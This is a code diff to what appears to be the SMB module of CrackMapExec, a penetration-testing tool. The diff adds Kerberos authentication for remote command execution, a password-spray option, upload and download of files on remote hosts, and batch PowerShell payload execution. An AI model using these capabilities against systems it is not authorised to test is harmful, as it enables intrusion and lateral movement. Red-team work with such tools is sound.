@@ -11,6 +11,7 @@ from impacket.nmb import NetBIOSError
 from impacket.dcerpc.v5 import transport, lsat, lsad
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5.transport import DCERPCTransportFactory
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
 from impacket.dcerpc.v5.dcom.wmi import WBEM_FLAG_FORWARD_ONLY
 from impacket.dcerpc.v5.samr import SID_NAME_USE
@@ -80,7 +81,6 @@ def requires_smb_server(func):
                 smb_server.start()
 
         output = func(self, *args, **kwargs)
-
         if smb_server is not None:
             #with sem:
             smb_server.shutdown()
@@ -113,6 +113,7 @@ class smb(connection):
     def proto_args(parser, std_parser, module_parser):
         smb_parser = parser.add_parser('smb', help="own stuff using SMB", parents=[std_parser, module_parser])
         smb_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
+        smb_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
         dgroup = smb_parser.add_mutually_exclusive_group()
         dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, help="domain to authenticate to")
         dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
@@ -153,6 +154,10 @@ class smb(connection):
         sgroup.add_argument("--depth", type=int, default=None, help='max spider recursion depth (default: infinity & beyond)')
         sgroup.add_argument("--only-files", action='store_true', help='only spider files')
 
+        tgroup = smb_parser.add_argument_group("Files", "Options for put and get remote files")
+        tgroup.add_argument("--put-file", nargs=2, metavar="FILE", help='Put a local file into remote target, ex: whoami.txt \\\\Windows\\\\Temp\\\\whoami.txt')
+        tgroup.add_argument("--get-file", nargs=2, metavar="FILE", help='Get a remote file, ex: \\\\Windows\\\\Temp\\\\whoami.txt whoami.txt')
+
         cgroup = smb_parser.add_argument_group("Command Execution", "Options for executing commands")
         cgroup.add_argument('--exec-method', choices={"wmiexec", "mmcexec", "smbexec", "atexec"}, default=None, help="method to execute the command. Ignored if in MSSQL mode (default: wmiexec)")
         cgroup.add_argument('--force-ps32', action='store_true', help='force the PowerShell command to run in a 32-bit process')
@@ -181,6 +186,8 @@ class smb(connection):
             transport = DCERPCTransportFactory(stringBinding)
             transport.set_connect_timeout(5)
             dce = transport.get_dce_rpc()
+            if self._conn.kerberos:
+                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
             dce.connect()
             try:
                 dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
@@ -206,7 +213,7 @@ class smb(connection):
             #if "STATUS_ACCESS_DENIED" in e:
             pass
 
-        self.domain    = self.conn.getServerDomain()
+        self.domain    = self.conn.getServerDNSDomainName()
         self.hostname  = self.conn.getServerName()
         self.server_os = self.conn.getServerOS()
         self.signing   = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection['RequireSigning']
@@ -231,8 +238,9 @@ class smb(connection):
         if self.args.domain:
             self.domain = self.args.domain
 
-        if self.args.local_auth:
-            self.domain = self.hostname
+        # always print FQDN even if local auth
+        # if self.args.local_auth:
+        #     self.domain = self.hostname
 
         #Re-connect since we logged off
         self.create_conn_obj()
@@ -244,6 +252,30 @@ class smb(connection):
                                                                                       self.domain,
                                                                                       self.signing,
                                                                                       self.smbv1))
+    def kerberos_login(self, aesKey, kdcHost):
+        # dirty code to check if user is admin but pywerview does not support kerberos auth ...
+        error = ''
+        try:
+            self.conn.kerberosLogin('', '', self.domain, self.lmhash, self.nthash, aesKey, kdcHost)
+            # self.check_if_admin() # currently pywerview does not support kerberos auth
+        except SessionError as e:
+            error = e
+        try:
+            self.conn.connectTree("C$")
+            self.admin_privs = True
+        except SessionError as e:
+            pass
+        if not error:
+            out = u'{}\\{} {}'.format(self.domain,
+                                    self.conn.getCredentials()[0],
+                                    highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
+            self.logger.success(out)
+            return True
+        else:
+            self.logger.error(u'{} {} {}'.format(self.domain, 
+                                                 error, 
+                                                 '({})'.format(desc) if self.args.verbose else ''))
+            return False
 
     def plaintext_login(self, domain, username, password):
         try:
@@ -366,7 +398,6 @@ class smb(connection):
                 lmhash, nthash = self.hash.split(':')
             else:
                 nthash = self.hash
-
         self.admin_privs = invoke_checklocaladminaccess(self.host, self.domain, self.username, self.password, lmhash, nthash)
 
     def gen_relay_list(self):
@@ -391,7 +422,7 @@ class smb(connection):
 
             if method == 'wmiexec':
                 try:
-                    exec_method = WMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)
+                    exec_method = WMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.kerberos, self.aesKey, self.kdcHost, self.hash, self.args.share)
                     logging.debug('Executed command via wmiexec')
                     break
                 except:
@@ -411,7 +442,7 @@ class smb(connection):
 
             elif method == 'atexec':
                 try:
-                    exec_method = TSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
+                    exec_method = TSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.kerberos, self.aesKey, self.kdcHost, self.hash) #self.args.share)
                     logging.debug('Executed command via atexec')
                     break
                 except:
@@ -421,7 +452,7 @@ class smb(connection):
 
             elif method == 'smbexec':
                 try:
-                    exec_method = SMBEXEC(self.host, self.smb_share_name, self.args.port, self.username, self.password, self.domain, self.hash, self.args.share)
+                    exec_method = SMBEXEC(self.host, self.smb_share_name, self.args.port, self.username, self.password, self.domain, self.kerberos, self.aesKey, self.kdcHost, self.hash, self.args.share)
                     logging.debug('Executed command via smbexec')
                     break
                 except:
@@ -447,7 +478,13 @@ class smb(connection):
             payload = self.args.ps_execute
             if not self.args.no_output: get_output = True
 
-        return self.execute(create_ps_command(payload, force_ps32=force_ps32, dont_obfs=dont_obfs), get_output, methods)
+        if os.path.isfile(payload):
+            with open(payload) as commands:
+                for c in commands:
+                    self.execute(create_ps_command(c, force_ps32=force_ps32, dont_obfs=dont_obfs), get_output, methods)
+        else:
+            self.execute(create_ps_command(payload, force_ps32=force_ps32, dont_obfs=dont_obfs), get_output, methods)
+        return ''
 
     def shares(self):
         temp_dir = ntpath.normpath("\\" + gen_random_string())
@@ -794,6 +831,26 @@ class smb(connection):
         dce.disconnect()
 
         return entries
+
+    @requires_admin
+    def put_file(self):
+        self.logger.info('Copy {} to {}'.format(self.args.put_file[0], self.args.put_file[1]))
+        with open(self.args.put_file[0], 'rb') as file:
+            try:
+                self.conn.putFile(self.args.share, self.args.put_file[1], file.read)
+                self.logger.success('Created file {} on \\\\{}{}'.format(self.args.put_file[0], self.args.share, self.args.put_file[1]))
+            except Exception as e:
+                self.logger.error('Error writing file to share {}: {}'.format(self.args.share, e))
+
+    @requires_admin
+    def get_file(self):
+        self.logger.info('Copy {} to {}'.format(self.args.get_file[0], self.args.get_file[1]))
+        with open(self.args.get_file[1], 'wb+') as file:
+            try:
+                self.conn.getFile(self.args.share, self.args.get_file[0], file.write)
+                self.logger.success('File {} was transferred to {}'.format(self.args.get_file[0], self.args.get_file[1]))
+            except Exception as e:
+                self.logger.error('Error reading file {}: {}'.format(self.args.share, e))
 
     def enable_remoteops(self):
         if self.remote_ops is not None and self.bootkey is not None:
